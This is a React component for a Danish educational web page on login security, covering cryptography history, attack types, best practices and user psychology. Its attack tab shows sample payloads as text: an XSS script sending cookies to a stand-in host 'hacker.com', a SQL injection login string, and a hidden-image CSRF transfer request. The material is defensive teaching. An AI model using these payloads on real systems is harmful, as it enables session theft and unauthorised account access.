import { useState } from 'react';
import { Box, Title, Text, Container, Paper, Tabs, Timeline, Card, Group, ThemeIcon, Badge, List, Button, Progress, SimpleGrid, Accordion, Divider, Image } from '@mantine/core';
import { Shield, WarningOctagon, Book, LockKey, CodeBlock, CheckCircle, X, CaretRight, Brain, Info, Lightning, ArrowsLeftRight, Check } from '@phosphor-icons/react';
import { Link } from '@tanstack/react-router';

function Learn() {
	const [activeTab, setActiveTab] = useState<string | null>('intro');
	const [completedLessons, setCompletedLessons] = useState<string[]>([]);
	const [expandedTimeline, setExpandedTimeline] = useState(false);

	const markLessonCompleted = (lessonId: string) => {
		if (!completedLessons.includes(lessonId)) {
			setCompletedLessons([...completedLessons, lessonId]);
		}
	};

	const isLessonCompleted = (lessonId: string) => {
		return completedLessons.includes(lessonId);
	};

	const calculateProgress = () => {
		const totalLessons = 5; // Update this based on your total lessons
		return Math.round((completedLessons.length / totalLessons) * 100);
	};

	return (
		<Box p='xl'>
			<Container size='xl'>
				<Paper withBorder p='lg' radius='md' className='bg-blue-900/10 text-white mb-6'>
					<Group justify='space-between' className='mb-4'>
						<Group>
							<Book size={30} className='text-blue-400' weight='fill' />
							<Title order={2}>Lær om Login Sikkerhed</Title>
						</Group>
						<Badge color='blue' size='lg'>
							{calculateProgress()}% Gennemført
						</Badge>
					</Group>

					<Progress value={calculateProgress()} size='md' className='mb-4' color='blue' />

					<Text size='lg' mb={24}>
						Udforsk disse lektioner for at lære om vigtigheden af sikker login praksis og hvordan hackerangreb fungerer.
					</Text>

					<Tabs value={activeTab} onChange={setActiveTab} className='mb-6' color='blue'>
						<Tabs.List grow>
							<Tabs.Tab value='intro' leftSection={<Info size={16} />}>
								Introduktion
							</Tabs.Tab>
							<Tabs.Tab value='history' leftSection={<Book size={16} />}>
								Historisk Kontekst
							</Tabs.Tab>
							<Tabs.Tab value='attacks' leftSection={<Lightning size={16} />}>
								Angrebstyper
							</Tabs.Tab>
							<Tabs.Tab value='best-practices' leftSection={<Shield size={16} />}>
								Bedste Praksis
							</Tabs.Tab>
							<Tabs.Tab value='psychology' leftSection={<Brain size={16} />}>
								Psykologiske Aspekter
							</Tabs.Tab>
						</Tabs.List>

						<Tabs.Panel value='intro' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Introduktion til Login Sikkerhed
									</Title>

									<Text mb={16}>Login-systemer er den primære indgang til digitale tjenester og beskytter følsomme oplysninger. De er også et af de mest almindelige mål for hackere og cyberkriminelle.</Text>

									<Text mb={16}>I denne læringsmodul vil du opdage:</Text>

									<List spacing='sm' mb={20}>
										<List.Item
											icon={
												<ThemeIcon color='blue' size='sm' radius='xl'>
													<CaretRight size={14} weight='bold' />
												</ThemeIcon>
											}
										>
											Historien bag kryptografi og autentifikation
										</List.Item>
										<List.Item
											icon={
												<ThemeIcon color='blue' size='sm' radius='xl'>
													<CaretRight size={14} weight='bold' />
												</ThemeIcon>
											}
										>
											Almindelige sikkerhedssårbarheder i login-systemer
										</List.Item>
										<List.Item
											icon={
												<ThemeIcon color='blue' size='sm' radius='xl'>
													<CaretRight size={14} weight='bold' />
												</ThemeIcon>
											}
										>
											Bedste praksis for at beskytte dine brugere
										</List.Item>
										<List.Item
											icon={
												<ThemeIcon color='blue' size='sm' radius='xl'>
													<CaretRight size={14} weight='bold' />
												</ThemeIcon>
											}
										>
											Psykologien bag brugeradfærd og sikkerhed
										</List.Item>
									</List>

									<Button color='blue' onClick={() => markLessonCompleted('intro')} fullWidth>
										{isLessonCompleted('intro') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Image src='./enigma.png' alt='Enigma maskine' height={200} fit='contain' className='mb-4' />

									<Title order={3} mb={12}>
										Læringsveje
									</Title>

									<Text size='sm' mb={16}>
										Der er to måder at udforske dette læringsmateriale på:
									</Text>

									<List spacing='md' mb={20}>
										<List.Item
											icon={
												<ThemeIcon color='green' size='md' radius='xl'>
													<LockKey size={16} weight='bold' />
												</ThemeIcon>
											}
										>
											<Text fw='bold'>Guidet rejse</Text>
											<Text size='sm'>Følg fanebladsinddelingen fra venstre til højre for en struktureret tilgang</Text>
										</List.Item>
										<List.Item
											icon={
												<ThemeIcon color='orange' size='md' radius='xl'>
													<Brain size={16} weight='bold' />
												</ThemeIcon>
											}
										>
											<Text fw='bold'>Praktisk læring</Text>
											<Text size='sm'>Udforsk de interaktive login-sider og sammenlign sikker og usikker implementation</Text>
										</List.Item>
									</List>

									<SimpleGrid cols={2} spacing='sm'>
										<Link to='/login-safe' className='w-full'>
											<Button variant='outline' color='green' fullWidth leftSection={<Shield size={16} />}>
												Sikker Login
											</Button>
										</Link>

										<Link to='/login-unsafe' className='w-full'>
											<Button variant='outline' color='red' fullWidth leftSection={<WarningOctagon size={16} />}>
												Usikker Login
											</Button>
										</Link>
									</SimpleGrid>
								</Card>
							</SimpleGrid>
						</Tabs.Panel>

						<Tabs.Panel value='history' pt='xl'>
							<SimpleGrid cols={3} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Kryptografiens Historie
									</Title>

									<Text mb={16}>Kryptografi og sikker kommunikation har rødder, der går tusindvis af år tilbage. Fra antikke cæsar-ciffre til moderne hashing-algoritmer, har mennesker altid søgt at beskytte følsomme oplysninger.</Text>

									<Timeline active={expandedTimeline ? 5 : 1} bulletSize={24} lineWidth={2}>
										<Timeline.Item bullet={<Book size={12} />} title='Antikken'>
											<Text size='sm' color='dimmed'>
												Cæsar-ciffer og simple substitutionscifre
											</Text>
										</Timeline.Item>
										<Timeline.Item bullet={<Book size={12} />} title='1500-1800-tallet'>
											<Text size='sm' color='dimmed'>
												Mekaniske krypteringsenheder udvikles
											</Text>
										</Timeline.Item>
										<Timeline.Item bullet={<Book size={12} />} title='2. Verdenskrig'>
											<Text size='sm' color='dimmed'>
												Enigma-maskinen og Alan Turings kodebrydningsarbejde
											</Text>
										</Timeline.Item>
										<Timeline.Item bullet={<Book size={12} />} title="1970'erne">
											<Text size='sm' color='dimmed'>
												Udvikling af DES og begyndelsen på moderne kryptografi
											</Text>
										</Timeline.Item>
										<Timeline.Item bullet={<Book size={12} />} title='I dag'>
											<Text size='sm' color='dimmed'>
												Avancerede hashing-algoritmer, SSL/TLS, og kvanteresistente algoritmer
											</Text>
										</Timeline.Item>
									</Timeline>

									<Button variant='subtle' color='blue' onClick={() => setExpandedTimeline(!expandedTimeline)} mt={8} fullWidth>
										{expandedTimeline ? 'Vis mindre' : 'Vis mere'}
									</Button>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Enigma-maskinen
									</Title>

									<Image src='https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/EnigmaMachineLabeled.jpg/300px-EnigmaMachineLabeled.jpg' alt='Enigma maskine diagram' height={200} className='mb-4' />

									<Text mb={16}>Enigma-maskinen var en avanceret krypteringsanordning brugt af Tyskland under 2. Verdenskrig. Den brugte roterende mekaniske hjul til at kryptere meddelelser, hvilket skabte det der dengang blev anset som ubrydelige koder.</Text>

									<Text mb={16}>Enigmas styrker og svagheder illustrerer kerneprincipperne for moderne sikkerhed:</Text>

									<List
										spacing='sm'
										mb={20}
										icon={
											<ThemeIcon color='blue' size='sm' radius='xl'>
												<Info size={14} />
											</ThemeIcon>
										}
									>
										<List.Item>Kryptografisk kompleksitet gør angreb vanskelige</List.Item>
										<List.Item>Mønstergenkendelse kan afsløre svagheder</List.Item>
										<List.Item>Mennesker er ofte det svageste led i sikkerhedskæden</List.Item>
										<List.Item>Operationelle fejl kan kompromittere selv stærke systemer</List.Item>
									</List>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Fra Enigma til Moderne Login
									</Title>

									<Text mb={16}>Der er bemærkelsesværdige paralleller mellem Enigma-kryptering og moderne login-sikkerhed:</Text>

									<Accordion variant='contained' mb={20}>
										<Accordion.Item value='complexity'>
											<Accordion.Control>
												<Text fw='bold'>Kompleksitet</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<Text size='sm'>Enigma brugte roterende hjul og stikkere for kompleksitet. Moderne login-systemer bruger saltet hashing, flere autentifikationsfaktorer og kryptografiske nøgler.</Text>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='weaknesses'>
											<Accordion.Control>
												<Text fw='bold'>Svagheder</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<Text size='sm'>Enigma havde svagheder i både design og anvendelse. Moderne login-systemer kan kompromitteres af dårlig implementation, svage adgangskoder, eller social engineering.</Text>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='evolution'>
											<Accordion.Control>
												<Text fw='bold'>Evolution</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<Text size='sm'>Ligesom Enigma blev forbedret over tid for at lukke sårbarheder, udvikler moderne login-systemer sig konstant for at modstå nye angrebsteknikker og -teknologier.</Text>
											</Accordion.Panel>
										</Accordion.Item>
									</Accordion>

									<Button color='blue' onClick={() => markLessonCompleted('history')} fullWidth>
										{isLessonCompleted('history') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>
							</SimpleGrid>
						</Tabs.Panel>

						<Tabs.Panel value='attacks' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Almindelige Angrebstyper
									</Title>

									<Tabs variant='pills' radius='md' defaultValue='xss' className='mb-4' color='red'>
										<Tabs.List grow>
											<Tabs.Tab value='xss' leftSection={<CodeBlock size={16} />}>
												XSS
											</Tabs.Tab>
											<Tabs.Tab value='sql' leftSection={<CodeBlock size={16} />}>
												SQL Injection
											</Tabs.Tab>
											<Tabs.Tab value='csrf' leftSection={<CodeBlock size={16} />}>
												CSRF
											</Tabs.Tab>
										</Tabs.List>

										<Tabs.Panel value='xss' pt='md'>
											<Title order={4} mb={8}>
												Cross-Site Scripting (XSS)
											</Title>

											<Text mb={12}>XSS-angreb indsprøjter ondsindet kode i en webside, så den udføres i andre brugeres browsere. Dette kan bruges til at stjæle cookies, session-tokens eller andre følsomme oplysninger.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>{`<input value="<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>">`}</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Sanitér alt brugerinput før det vises</List.Item>
												<List.Item>Anvend Content Security Policy (CSP)</List.Item>
												<List.Item>Brug frameworks som React, der automatisk eskaperer HTML</List.Item>
											</List>

											<Link to='/login-unsafe' className='w-full'>
												<Button color='red' variant='light' fullWidth>
													Se XSS Demo
												</Button>
											</Link>
										</Tabs.Panel>

										<Tabs.Panel value='sql' pt='md'>
											<Title order={4} mb={8}>
												SQL Injection
											</Title>

											<Text mb={12}>SQL-injektion manipulerer database-forespørgsler ved at indsprøjte ondsindet SQL-kode, hvilket kan give uautoriseret adgang til data eller ændre database-indhold.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
												{`username: admin' OR 1=1 --
query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anything'`}
											</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Brug parameteriserede forespørgsler eller prepared statements</List.Item>
												<List.Item>Anvend ORM (Object-Relational Mapping) værktøjer</List.Item>
												<List.Item>Validér og rens alt brugerinput</List.Item>
											</List>

											<Link to='/login-unsafe' className='w-full'>
												<Button color='red' variant='light' fullWidth>
													Se SQL Injection Demo
												</Button>
											</Link>
										</Tabs.Panel>

										<Tabs.Panel value='csrf' pt='md'>
											<Title order={4} mb={8}>
												Cross-Site Request Forgery (CSRF)
											</Title>

											<Text mb={12}>CSRF-angreb tvinger brugere til at udføre uønskede handlinger på webapplikationer, hvor de er logget ind. Angribere udnytter, at browseren automatisk inkluderer cookies i anmodninger.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
												{`<!-- Ondsindet webside -->
<img src="https://bank.com/transfer?to=hacker&amount=1000" style="display:none">`}
											</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Implementér CSRF-tokens i alle formularer</List.Item>
												<List.Item>Brug SameSite cookie-attributten</List.Item>
												<List.Item>Kræv bekræftelse for følsomme handlinger</List.Item>
											</List>

											<Link to='/login-safe' className='w-full'>
												<Button color='green' variant='light' fullWidth>
													Se CSRF Beskyttelse
												</Button>
											</Link>
										</Tabs.Panel>
									</Tabs>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Andre Sikkerhedstrusler
									</Title>

									<SimpleGrid cols={2} spacing='md' mb={20}>
										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Brute Force</Text>
											</Group>
											<Text size='sm'>Systematisk afprøvning af alle mulige adgangskoder indtil den rigtige findes. Beskyttelse: Rate limiting, account lockout, captchas.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Credential Stuffing</Text>
											</Group>
											<Text size='sm'>Brug af lækkede brugernavn/adgangskode-kombinationer fra ét site på andre sites. Beskyttelse: Unikke adgangskoder, to-faktor autentifikation.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Phishing</Text>
											</Group>
											<Text size='sm'>Falske emails eller websites designet til at narre brugere til at afsløre login-oplysninger. Beskyttelse: Brugeruddannelse, HTTPS, anti-phishing værktøjer.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Man-in-the-Middle</Text>
											</Group>
											<Text size='sm'>Ondsindet aktør opsnappper kommunikation mellem bruger og server. Beskyttelse: HTTPS, certificate pinning, kryptering.</Text>
										</Paper>
									</SimpleGrid>

									<Title order={4} mb={12}>
										Angrebsstatistik
									</Title>

									<Text mb={20}>Login-relaterede angreb er en af de mest almindelige indgangsveje for cyberkriminelle. Ifølge sikkerhedsrapporter udgør credential stuffing og brute force angreb over 60% af alle angreb mod webapplikationer.</Text>

									<Button color='blue' onClick={() => markLessonCompleted('attacks')} fullWidth>
										{isLessonCompleted('attacks') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>
							</SimpleGrid>
						</Tabs.Panel>

						<Tabs.Panel value='best-practices' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Bedste Praksis for Login Sikkerhed
									</Title>

									<Accordion variant='separated' mb={20}>
										<Accordion.Item value='password-storage'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Sikker Adgangskode Opbevaring</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Gem aldrig adgangskoder i klartekst</List.Item>
													<List.Item>Brug stærke hashing-algoritmer som bcrypt, Argon2 eller PBKDF2</List.Item>
													<List.Item>Tilføj unikke salt-værdier til hver adgangskode før hashing</List.Item>
													<List.Item>Anvend tilstrækkelige arbejdsfaktorer for at modstå brute force</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Eksempel med bcrypt (Node.js)
const bcrypt = require('bcrypt');
const saltRounds = 12;

// Hashing af adgangskode
const hashedPassword = await bcrypt.hash(password, saltRounds);

// Verificering af adgangskode
const isMatch = await bcrypt.compare(inputPassword, hashedPassword);`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='authentication'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Robust Autentifikation</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Implementér to-faktor autentifikation (2FA)</List.Item>
													<List.Item>Kræv stærke adgangskoder (længde, kompleksitet, ingen almindelige ord)</List.Item>
													<List.Item>Brug sikre session management med korrekt konfigurerede cookies</List.Item>
													<List.Item>Implementér rate limiting og account lockout for at forhindre brute force</List.Item>
												</List>

												<Text size='sm' mt={12}>
													To-faktor autentifikation giver et ekstra sikkerhedslag ved at kræve noget brugeren har (f.eks. en mobiltelefon) udover noget brugeren ved (adgangskoden).
												</Text>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='csrf-protection'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>CSRF-beskyttelse</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<Text size='sm' mb={12}>
													Cross-Site Request Forgery (CSRF) beskyttelse forhindrer angribere i at udføre handlinger på brugerens vegne.
												</Text>

												<List spacing='sm'>
													<List.Item>Generér unikke CSRF-tokens for hver session</List.Item>
													<List.Item>Inkluder tokens i alle formularer og AJAX-anmodninger</List.Item>
													<List.Item>Validér tokens på serversiden for hver anmodning der ændrer tilstand</List.Item>
													<List.Item>Brug SameSite cookie-attributten</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Generér CSRF token
const csrfToken = crypto.randomBytes(16).toString('hex');
req.session.csrfToken = csrfToken;

// På klientsiden i alle formularer
<input type="hidden" name="csrf_token" value="${'{csrfToken}'}" />

// Validér token på server
if (req.body.csrf_token !== req.session.csrfToken) {
  return res.status(403).send('Ugyldig CSRF token');
}`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='input-validation'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Input Validering og Sanitering</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<Text size='sm' mb={12}>
													Validering og sanitering beskytter mod XSS, SQL-injektion og andre indsprøjtningsangreb.
												</Text>

												<List spacing='sm'>
													<List.Item>Valider alle brugerinput på både klient- og serverside</List.Item>
													<List.Item>Brug whitelisting i stedet for blacklisting når muligt</List.Item>
													<List.Item>Sanitér output, der vises tilbage til brugeren</List.Item>
													<List.Item>Anvend prepared statements eller parameteriserede forespørgsler for database</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Sanitering af input
const sanitized = DOMPurify.sanitize(userInput);

// Parameteriserede database-forespørgsler
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, passwordHash]);`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>
									</Accordion>

									<Button color='blue' onClick={() => markLessonCompleted('best-practices')} fullWidth>
										{isLessonCompleted('best-practices') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Sikkerhedssammenligning
									</Title>

									<Paper withBorder p='md' radius='md' className='bg-blue-900/40 mb-4'>
										<Group justify='space-between' mb={8}>
											<Group>
												<Shield size={20} className='text-green-400' weight='fill' />
												<Text fw='bold'>Sikker Implementation</Text>
											</Group>
											<Badge color='green'>Anbefalet</Badge>
										</Group>

										<SimpleGrid cols={2} spacing='xs'>
											<Text size='sm'>✓ Adgangskoder hashes og saltes</Text>
											<Text size='sm'>✓ CSRF-beskyttelse</Text>
											<Text size='sm'>✓ Input sanitering mod XSS</Text>
											<Text size='sm'>✓ Rate limiting</Text>
											<Text size='sm'>✓ Parameteriserede queries</Text>
											<Text size='sm'>✓ Sikre, HttpOnly cookies</Text>
										</SimpleGrid>
									</Paper>

									<Paper withBorder p='md' radius='md' className='bg-red-900/40 mb-20'>
										<Group justify='space-between' mb={8}>
											<Group>
												<WarningOctagon size={20} className='text-red-400' weight='fill' />
												<Text fw='bold'>Usikker Implementation</Text>
											</Group>
											<Badge color='red'>Farlig</Badge>
										</Group>

										<SimpleGrid cols={2} spacing='xs'>
											<Text size='sm'>✗ Klartekst adgangskoder</Text>
											<Text size='sm'>✗ Ingen CSRF-tokens</Text>
											<Text size='sm'>✗ Sårbar over for XSS</Text>
											<Text size='sm'>✗ Ubegrænset login-forsøg</Text>
											<Text size='sm'>✗ Sårbar over for SQL-injektion</Text>
											<Text size='sm'>✗ Usikker session håndtering</Text>
										</SimpleGrid>
									</Paper>

									<Link to='/compare' className='w-full'>
										<Button color='grape' fullWidth leftSection={<ArrowsLeftRight size={18} />}>
											Se Detaljeret Sammenligning
										</Button>
									</Link>
								</Card>
							</SimpleGrid>
						</Tabs.Panel>

						<Tabs.Panel value='psychology' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Psykologiske Aspekter af Sikkerhed
									</Title>

									<Text mb={16}>Forståelse af menneskelig psykologi er afgørende for at bygge effektive sikkerhedssystemer. Mange sikkerhedsbrister skyldes ikke tekniske fejl, men menneskers adfærd og beslutninger.</Text>

									<SimpleGrid cols={2} spacing='md' mb={20}>
										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Bekvemlighed vs. Sikkerhed
											</Title>
											<Text size='sm'>Mennesker prioriterer ofte bekvemmelighed over sikkerhed og vælger nemmere men mindre sikre muligheder. Dette er grunden til at mange genbruger adgangskoder eller vælger simple koder, der er lette at huske.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Social Engineering
											</Title>
											<Text size='sm'>Social engineering udnytter menneskelig tillid og psykologiske tendenser. Teknikker som phishing, pretexting og baiting udnytter menneskers naturlige tilbøjelighed til at stole på andre.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Sikkerhedstræthed
											</Title>
											<Text size='sm'>For mange sikkerhedskrav fører til "sikkerhedstræthed", hvor brugere udvikler arbejdsomgåelser eller ignorerer sikkerhedsforholdsregler helt. Balance er nøglen til effektiv sikkerhed.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Risikoperception
											</Title>
											<Text size='sm'>Mennesker har en tendens til at undervurdere cybersikkerhedsrisici, da de ofte er usynlige eller abstrakte. Dette fører til manglende motivation til at følge sikkerhedspraksis.</Text>
										</Paper>
									</SimpleGrid>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Designprincipper for Brugervenlig Sikkerhed
									</Title>

									<Text mb={16}>At forene god sikkerhed med god brugeroplevelse er muligt ved at følge disse principper:</Text>

									<List
										spacing='md'
										mb={20}
										icon={
											<ThemeIcon color='green' size='md' radius='xl'>
												<Check size={16} weight='bold' />
											</ThemeIcon>
										}
									>
										<List.Item>
											<Text fw='bold'>Gør det nemt at gøre det rigtige</Text>
											<Text size='sm'>Design systemer, hvor den sikreste handling også er den nemmeste. F.eks. brug af adgangskode-managers med auto-udfyldning.</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Gør sikkerhed synlig og forståelig</Text>
											<Text size='sm'>Giv klare, relevante sikkerhedsfeedback til brugerne. Vis f.eks. adgangskodestyrke i realtid med visuelt feedback.</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Minimér kognitiv belastning</Text>
											<Text size='sm'>Reducér mængden af sikkerhedsbeslutninger, brugere skal tage. Brug fornuftige standardindstillinger der favoriserer sikkerhed.</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Design for fejl</Text>
											<Text size='sm'>Antag at brugere vil lave fejl, og design systemer der kan håndtere disse fejl sikkert. Tillad sikker nulstilling af adgangskoder med flere verifikationstrin.</Text>
										</List.Item>
									</List>

									<Divider my='md' />

									<Group justify='space-between' mb={16}>
										<Title order={5}>Citat:</Title>
										<Badge color='blue'>Indsigt</Badge>
									</Group>

									<Paper withBorder p='md' radius='md' className='bg-blue-900/40 mb-12 italic'>
										<Text>"Hvis du tror teknologi kan løse dine sikkerhedsproblemer, forstår du hverken problemerne eller teknologien."</Text>
										<Text size='sm' ta='right' mt={8}>
											— Bruce Schneier, Sikkerhedsekspert
										</Text>
									</Paper>

									<Button color='blue' onClick={() => markLessonCompleted('psychology')} fullWidth>
										{isLessonCompleted('psychology') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>
							</SimpleGrid>
						</Tabs.Panel>
					</Tabs>
				</Paper>
			</Container>
		</Box>
	);
}

export default Learn;
